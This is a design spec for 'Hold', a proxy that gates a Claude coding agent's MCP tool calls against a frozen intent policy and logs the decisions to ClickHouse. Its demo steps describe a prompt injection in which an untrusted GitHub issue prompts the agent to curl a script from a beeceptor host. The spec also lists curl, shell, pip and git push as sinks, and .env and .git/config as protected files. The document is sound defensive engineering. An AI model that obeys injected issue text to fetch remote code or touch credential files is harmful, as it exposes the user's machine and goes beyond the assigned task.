# SPEC.md — Hold MVP Architectural Blueprint

---

## 1. System Architecture Overview

```text
[ Developer Intent ] ──> [ Semgrep Rule Engine ] ──> Freezes ──> [ Intent Receipt ]
                                                                        │
[ Untrusted GitHub Issue ] ──> [ Claude Coding Agent ]                 │
                                      │                                 ▼
                               (MCP tools/call) ───> [ Hold Wire Proxy ]
                                                              │
                                     ┌────────────────────────┴────────────────────────┐
                                     ▼ (In-Scope: < 1ms)                               ▼ (Out-of-Scope: < 1.5ms)
                             [ MCP Tool Server ]                             [ 403 Security Exception ]
                             (Local Filesystem)                               (Zero Syscalls, Zero LLM)
                                                                                       │
                                                                                       ▼
                                                                             [ ClickHouse Database ]
                                                                                       │
                                                                                       ▼
                                                                             [ Live Attack DAG UI ]
```

1. **Policy Generator (`semgrep`):** Scans the target repo and MCP tool schemas (`tools.json`). Flags `bash_exec`, `curl`, `pip`, and `git_push` as Sinks; flags `.env`, `.git/config`, and workflows as Protected Resources. Generates `intent_receipt.json`.
2. **Reverse Proxy (`proxy.py`):** Sits on the MCP stdio wire between Claude and MCP tool servers. Intercepts `tools/call` JSON-RPC messages.
3. **Capability Gate (`gate.py`):** In-memory evaluator checking parameters against `IntentReceipt`. Returns `ALLOW` or `DENY` in `< 1.5ms`.
4. **Log Store (`ClickHouse`):** Stores structured decision logs with microsecond resolution.
5. **Visualizer (`ui/`):** Single-page web dashboard polling ClickHouse and rendering the live DAG with Cytoscape.js.

---

## 2. Database Schema (`schema.sql` for ClickHouse)

```sql
CREATE TABLE IF NOT EXISTS hold_events (
    event_id UUID DEFAULT generateUUIDv4(),
    timestamp DateTime64(3) DEFAULT now64(),
    task_id String,
    agent_id LowCardinality(String),
    tool_name LowCardinality(String),
    sink_category LowCardinality(String), -- 'FS_READ' | 'FS_WRITE' | 'NETWORK_EGRESS' | 'SHELL_EXEC' | 'GIT_MUTATION'
    target_resource String,
    decision LowCardinality(String),      -- 'ALLOW' | 'DENY'
    decision_latency_us UInt32,           -- Microsecond resolution
    violation_reason String,
    intent_hash String
) ENGINE = MergeTree()
ORDER BY (timestamp, task_id);

-- Live Dashboard Query (Executed every 500ms):
-- SELECT timestamp, tool_name, sink_category, target_resource, decision, decision_latency_us 
-- FROM hold_events WHERE task_id = {current_task} ORDER BY timestamp DESC LIMIT 20;
```

---

## 3. User Flow Steps (Live Demo Execution)

1. **Step 1: Task Assignment & Intent Freeze (0.5 sec)**  
   Developer runs: `hold run --task "Fix NoneType crash in src/flask/app.py" -- claude ...`  
   Semgrep freezes `IntentReceipt`: Writes = `["src/flask/app.py"]`, Network = `NONE`, Shell = `NONE`.
2. **Step 2: Normal Code Read (0.6ms)**  
   Claude requests `read_file("src/flask/app.py")`. Proxy validates path against allowlist. Forwards to filesystem.
3. **Step 3: Attack Intercept (< 1.5ms)**  
   Untrusted GitHub issue prompts: `curl -s https://iamtesting.free.beeceptor.com/reproduce_issue.py`.  
   Claude invokes `fetch` or `bash`. Proxy intercepts call on the wire, detects egress violation, terminates with JSON-RPC error `-32003`, and logs `DENY` to ClickHouse. **Zero packets leave the machine.**
4. **Step 4: Graceful Repair (0.8ms)**  
   Claude receives error, gracefully falls back, and calls `write_file("src/flask/app.py")`. Proxy permits write.
5. **Step 5: Visual DAG Severing (Sub-second)**  
   ClickHouse streams the event to the UI dashboard. The exfiltration edge turns into a glowing red severed line with latency badge `[1.2ms]`.
